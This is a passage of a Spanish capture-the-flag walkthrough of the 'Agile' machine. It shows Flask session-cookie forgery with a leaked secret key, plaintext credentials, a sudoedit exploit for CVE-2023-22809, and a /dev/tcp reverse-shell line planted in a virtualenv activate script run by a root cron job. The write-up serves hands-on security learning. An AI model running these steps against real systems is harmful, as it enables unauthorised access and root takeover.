\\n/app/app-testing/__pycache__/wsgi-dev.cpython-310.pyc\\n/app/app-testing/tests/functional/creds.txt\\n/app/app-testing/tests/functional/__pycache__/test_site_interactively.cpython-310-pytest-7.2.0.pyc\\n/app/app-testing/tests/functional/test_site_interactively.py\\n/app/app-testing/requirements.txt\\n/app/app-testing/.pytest_cache/.gitignore\\n/app/app-testing/.pytest_cache/CACHEDIR.TAG\\n/app/app-testing/.pytest_cache/v/cache/stepwise\\n/app/app-testing/.pytest_cache/v/cache/nodeids\\n/app/app-testing/.pytest_cache/v/cache/lastfailed\\n/app/app-testing/.pytest_cache/README.md\\n/app/app-testing/superpass/views/__pycache__/home_views.cpython-310.pyc\\n/app/app-testing/superpass/views/__pycache__/account_views.cpython-310.pyc\\n/app/app-testing/superpass/views/__pycache__/vault_views.cpython-310.pyc\\n/app/app-testing/superpass/views/vault_views.py\\n/app/app-testing/superpass/views/home_views.py\\n/app/app-testing/superpass/views/account_views.py\\n/app/app-testing/superpass/__pycache__/app.cpython-310.pyc\\n/app/app-testing/superpass/__pycache__/__init__.cpython-310.pyc\\n~~~\\n\\n## Privilege Escalation a Edwards\\n\\nIntentamos acceder al servicio en el puerto 5555, es la misma aplicación pero corriendo como testing y localmente en el sistema Agile\\n\\n~~~bash\\nssh -L 8080:localhost:5555 corum@10.10.11.203\\n~~~\\n\\nNos registramos con un usuario e intentamos acceder a los recursos del sistema, pero no podemos.\\n\\nTomamos nuestra cookie y vemos que el id asignado es el 2\\n\\n~~~bash\\nflask-unsign --secret MNOHFl8C4WLc3DQTToeeg8ZT7WpADVhqHHXJ50bPZY6ybYKEr76jNvDfsWD --decode --cookie .eJzdkEuKwzAQRK8iem0G_WypfYrZDyF0t1qxwUkGy1mF3H005BZZFUXVg6KecK4btUUbzD9PMEcXuGprdFEY4HtTamq2-8WsN3PcDYn00BzL2sxv73zB6TV8OHca-km7tgXmY39od2uBGWohVOUg_4yrJUqxit4RyySaslrCgjVb69FLsM5LFnaxUmYq6JE1jNHjhGlErgm1YsLIYeRErogLk-TkvDIWh8EJ5ynXalO0Ghltn39-NN3fazy8_gAATZH3.ZAn1Rg.T8uAe8cVXAmBs1AoJY-LcqIjJHc\\n~~~\\n\\n~~~json\\n{'_flashes': [('message', 'Please log in to access this page.'), ('message', 'Please log in to access this page.'), ('message', 'Please log in to access this page.'), ('message', 'Please log in to access this page.'), ('message', 'Please log in to access this page.')], '_fresh': True, '_id': 'fda9eeb3cacce1fd4cd0e921abc6ce78e0a9d9f800292c3012c8cb14fa8bad929be3542969759bf79ef9794b35b7a1dc136c8712eb9d1931cb868ff0740e4b90', '_user_id': '2'}\\n~~~\\n\\nAsumimos que la SECRET_KEY es la misma e intentamos crear una sesion con el id 1\\n\\n~~~bash\\nflask-unsign --sign --cookie \\\"{'_flashes': [('message', 'Please log in to access this page.'), ('message', 'Please log in to access this page.')], '_fresh': True, '_id': 'fda9eeb3cacce1fd4cd0e921abc6ce78e0a9d9f800292c3012c8cb14fa8bad929be3542969759bf79ef9794b35b7a1dc136c8712eb9d1931cb868ff0740e4b90', '_user_id': '1'}\\\" -S  MNOHFl8C4WLc3DQTToeeg8ZT7WpADVhqHHXJ50bPZY6ybYKEr76jNvDfsWD \\n.eJydjkuKwzAQRK8iem0G_WypfYrZDyF0t1qxwUkGy1mF3H005AZZFUXVo-oJ57pRW7TB_PMEc3SBq7ZGF4UBvjelpma7X8x6M8fdkEgPzbGszfz2zhecXsOH3Gno47u2BeZjf2h3a4EZaiFU5SD_jKslSrGK3hHLJJqyWsKCNVvr0UuwzksWdrFSZirokTWM0eOEaUSuCbViwshh5ESuiAuT5OS8MhaHwQnnKddqU7QaGW2_f3403d9vHLz-APu_WkA.ZAYrig.VWDh3LEQeurRSGRbKa66sTMRUPA\\n~~~\\n\\nLogramos acceder a las credenciales del usuario edwards\\n\\n![](/Agile/Pasted_image_20230309120804.png)\\n\\n\\nSus datos son:\\n\\n~~~\\nedwards:d07867c6267dcb5df0af\\ndedwards__:7dbfe676b6b564ce5718\\n~~~\\n\\nFinalmente ingresamos al sistemas a través de ssh con estas últimas credenciales\\n\\n![](/Agile/Pasted_image_20230309121717.png)\\n\\n## User Edwards Enumeration\\n\\nVerificamos los permisos sudo\\n\\n~~~\\nsudo -l\\n~~~\\n\\n~~~bash\\n[sudo] password for edwards: \\nMatching Defaults entries for edwards on agile:\\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\\\:/usr/local/bin\\\\:/usr/sbin\\\\:/usr/bin\\\\:/sbin\\\\:/bin\\\\:/snap/bin, use_pty\\n\\nUser edwards may run the following commands on agile:\\n    (dev_admin : dev_admin) sudoedit /app/config_test.json\\n    (dev_admin : dev_admin) sudoedit /app/app-testing/tests/functional/creds.txt\\n\\n~~~\\n\\nCon sudoedit podemos modificar un archivo protegido por el administrador\\n\\nIntentamos acceder al archivo config_test.json\\n\\n~~~bash\\nsudo -u dev_admin sudoedit /app/config_test.json\\n~~~\\n\\nconfig_test.json\\n\\n![](/Agile/Pasted_image_20230309122920.png)\\n\\n~~~json\\n{\\n    \\\"SQL_URI\\\": \\\"mysql+pymysql://superpasstester:VUO8A2c2#3FnLq3*a9DX1U@localhost/superpasstest\\\"\\n}\\n~~~\\n\\nIntentamos acceder al archivo creds.txt\\n\\n~~~bash\\nsudo -u dev_admin sudoedit /app/app-testing/tests/functional/creds.txt\\n~~~\\n\\nSu cotenido es:\\n\\n![](/Agile/Pasted_image_20230309122823.png)\\n\\n~~~\\nedwards:1d7ffjwrx#$d6qn!9nndqgde4\\n~~~\\n\\n\\nVerificamos cuales son los archivos que el usuario web_admin puede modificar \\n\\n~~~bash\\nfind /  -user dev_admin 2>/dev/null | xargs ls -al --color\\n~~~\\n\\n~~~bash\\n-rw-r----- 1 dev_admin runner      34 Mar 10 17:18 /app/app-testing/tests/functional/creds.txt\\n-r--r----- 1 dev_admin www-data    88 Jan 25 00:00 /app/config_prod.json\\n-r--r----- 1 dev_admin runner      99 Jan 25 15:15 /app/config_test.json\\n~~~\\n\\nVerificamos que puede modificar el grupo dev_admin\\n\\n~~~bash\\nfind /  -group dev_admin 2>/dev/null | xargs ls -al --color\\n~~~\\n\\n~~~bash\\n-rw-r--r-- 1 root      dev_admin 9033 Mar 10 17:21 /app/venv/bin/Activate.ps1\\n-rw-rw-r-- 1 root      dev_admin 1976 Mar 10 17:21 /app/venv/bin/activate\\n-rw-r--r-- 1 root      dev_admin  902 Mar 10 17:21 /app/venv/bin/activate.csh\\n-rw-r--r-- 1 root      dev_admin 2044 Mar 10 17:21 /app/venv/bin/activate.fish\\n\\n/app/venv:\\ntotal 24\\ndrwxrwxr-x 5 root dev_admin 4096 Feb  8 16:29 .\\ndrwxr-xr-x 6 root root      4096 Feb  8 16:29 ..\\ndrwxrwxr-x 2 root dev_admin 4096 Mar 10 17:21 bin\\ndrwxrwxr-x 3 root root      4096 Feb  8 16:29 include\\ndrwxrwxr-x 3 root root      4096 Feb  8 16:29 lib\\nlrwxrwxrwx 1 root root         3 Jan 25 17:21 lib64 -> lib\\n-rw-rw-r-- 1 root root        70 Jan 25 17:21 pyvenv.cfg\\n\\n/app/venv/bin:\\ntotal 1380\\ndrwxrwxr-x 2 root dev_admin    4096 Mar 10 17:21 .\\ndrwxrwxr-x 5 root dev_admin    4096 Feb  8 16:29 ..\\n-rw-r--r-- 1 root dev_admin    9033 Mar 10 17:21 Activate.ps1\\n-rw-rw-r-- 1 root dev_admin    1976 Mar 10 17:21 activate\\n-rw-r--r-- 1 root dev_admin     902 Mar 10 17:21 activate.csh\\n-rw-r--r-- 1 root dev_admin    2044 Mar 10 17:21 activate.fish\\n-rwxrwxr-x 1 root root          213 Mar 10 17:21 flask\\n-rwxr-xr-x 1 root root          222 Jan 24 18:06 gunicorn\\n-rwxrwxr-x 1 root root          226 Mar 10 17:21 pip\\n-rwxrwxr-x 1 root root          226 Mar 10 17:21 pip3\\n-rwxrwxr-x 1 root root          226 Mar 10 17:21 pip3.10\\n-rwxrwxr-x 1 root root          226 Mar 10 17:21 py.test\\n-rwxrwxr-x 1 root root          226 Mar 10 17:21 pytest\\nlrwxrwxrwx 1 root root            7 Mar 10 17:21 python -> python3\\nlrwxrwxrwx 1 root root           16 Mar 10 17:21 python3 -> /usr/bin/python3\\nlrwxrwxrwx 1 root root            7 Mar 10 17:21 python3.10 -> python3\\n-rwxrwxr-x 1 root root      1349984 Jan 23 21:45 uwsgi\\nls: cannot open directory '/home/dev_admin': Permission denied\\n\\n~~~\\n\\nPara comprender mayormente el sistema revisamos el script test_and_update.sh\\n\\n~~~bash\\n#!/bin/bash\\n\\n# update prod with latest from testing constantly assuming tests are passing\\n\\necho \\\"Starting test_and_update\\\"\\ndate\\n\\n# if already running, exit\\nps auxww | grep -v \\\"grep\\\" | grep -q \\\"pytest\\\" && exit\\n\\necho \\\"Not already running. Starting...\\\"\\n\\n# start in dev folder\\ncd /app/app-testing\\n\\n# system-wide source doesn't seem to happen in cron jobs\\nsource /app/venv/bin/activate\\n\\n# run tests, exit if failure\\npytest -x 2>&1 >/dev/null || exit\\n\\n# tests good, update prod (flask debug mode will load it instantly)\\ncp -r superpass /app/app/\\necho \\\"Complete!\\\"\\n\\n~~~\\n\\nBásicamente lo que hace es validar la aplicación con un conjunto de pruebas, si estas prueabas son aprobadas, la aplicación es copiada en la carpeta /app y pasa a producción. Vemos que el script usa el archivo  /app/venv/bin/activate. Además, el usuario dev_admin tiene permisos de grupo para escribir sobre el.\\n\\nIntentaremos que el script source /app/venv/bin/activate quede de la siguiente forma (añadimos una shell reversa al final del script)\\n\\n~~~bash\\n# This file must be used with \\\"source bin/activate\\\" *from bash*\\n# you cannot run it directly\\n\\ndeactivate () {\\n    # reset old environment variables\\n    if [ -n \\\"${_OLD_VIRTUAL_PATH:-}\\\" ] ; then\\n        PATH=\\\"${_OLD_VIRTUAL_PATH:-}\\\"\\n        export PATH\\n        unset _OLD_VIRTUAL_PATH\\n    fi\\n    if [ -n \\\"${_OLD_VIRTUAL_PYTHONHOME:-}\\\" ] ; then\\n        PYTHONHOME=\\\"${_OLD_VIRTUAL_PYTHONHOME:-}\\\"\\n        export PYTHONHOME\\n        unset _OLD_VIRTUAL_PYTHONHOME\\n    fi\\n\\n    # This should detect bash and zsh, which have a hash command that must\\n    # be called to get it to forget past commands.  Without forgetting\\n    # past commands the $PATH changes we made may not be respected\\n    if [ -n \\\"${BASH:-}\\\" -o -n \\\"${ZSH_VERSION:-}\\\" ] ; then\\n        hash -r 2> /dev/null\\n    fi\\n\\n    if [ -n \\\"${_OLD_VIRTUAL_PS1:-}\\\" ] ; then\\n        PS1=\\\"${_OLD_VIRTUAL_PS1:-}\\\"\\n        export PS1\\n        unset _OLD_VIRTUAL_PS1\\n    fi\\n\\n    unset VIRTUAL_ENV\\n    unset VIRTUAL_ENV_PROMPT\\n    if [ ! \\\"${1:-}\\\" = \\\"nondestructive\\\" ] ; then\\n    # Self destruct!\\n        unset -f deactivate\\n    fi\\n}\\n\\n# unset irrelevant variables\\ndeactivate nondestructive\\n\\nVIRTUAL_ENV=\\\"/app/venv\\\"\\nexport VIRTUAL_ENV\\n\\n_OLD_VIRTUAL_PATH=\\\"$PATH\\\"\\nPATH=\\\"$VIRTUAL_ENV/bin:$PATH\\\"\\nexport PATH\\n\\n# unset PYTHONHOME if set\\n# this will fail if PYTHONHOME is set to the empty string (which is bad anyway)\\n# could use `if (set -u; : $PYTHONHOME) ;` in bash\\nif [ -n \\\"${PYTHONHOME:-}\\\" ] ; then\\n    _OLD_VIRTUAL_PYTHONHOME=\\\"${PYTHONHOME:-}\\\"\\n    unset PYTHONHOME\\nfi\\n\\nif [ -z \\\"${VIRTUAL_ENV_DISABLE_PROMPT:-}\\\" ] ; then\\n    _OLD_VIRTUAL_PS1=\\\"${PS1:-}\\\"\\n    PS1=\\\"(venv) ${PS1:-}\\\"\\n    export PS1\\n    VIRTUAL_ENV_PROMPT=\\\"(venv) \\\"\\n    export VIRTUAL_ENV_PROMPT\\nfi\\n\\n# This should detect bash and zsh, which have a hash command that must\\n# be called to get it to forget past commands.  Without forgetting\\n# past commands the $PATH changes we made may not be respected\\nif [ -n \\\"${BASH:-}\\\" -o -n \\\"${ZSH_VERSION:-}\\\" ] ; then\\n    hash -r 2> /dev/null\\nfi\\n0<&196;exec 196<>/dev/tcp/10.10.14.118/4242; sh <&196 >&196 2>&196\\n\\n~~~\\n\\nVerificamos la versión de sudo\\n\\n![](/Agile/Pasted_image_20230311000023.png)\\n\\n## Elevación de Privilegios\\n\\nPara escalar privilegios usamos una vulnerabilidad de sudoedit, especificamente esta:\\n\\n[CVE-2023-22809](https://nvd.nist.gov/vuln/detail/CVE-2023-22809)\\n[Detalles de vulnerabilidad](https://www.openwall.com/lists/oss-security/2023/01/19/1)\\n\\nEn base al exploit creamos la siguiente variable de  entorno\\n\\n~~~bash\\nexport EDITOR=vim -- /app/venv/bin/activate\\n~~~\\n\\nLuego intentamos modificar el archivo creds.txt\\n\\n~~~bash\\nsudoedit -g dev_admin -u dev_admin /app/app-testing/tests/functional/creds.txt\\n~~~\\n\\nAgregamos la linea para nuestra reverse shell\\n\\n![](/Agile/Pasted_image_20230311000753.png)\\n\\nGuardamos\\n\\n![](/Agile/Pasted_image_20230311000618.png)\\n\\nUsamos netcat para esuchar alguna conexión en el puerto 4242 y esperamos unos minutos\\n\\n![](/Agile/Pasted_image_20230310235255.png)\\n\\nFinalmente obtenemos acceso al sistema como root\\n\"}"},"__N_SSG":true}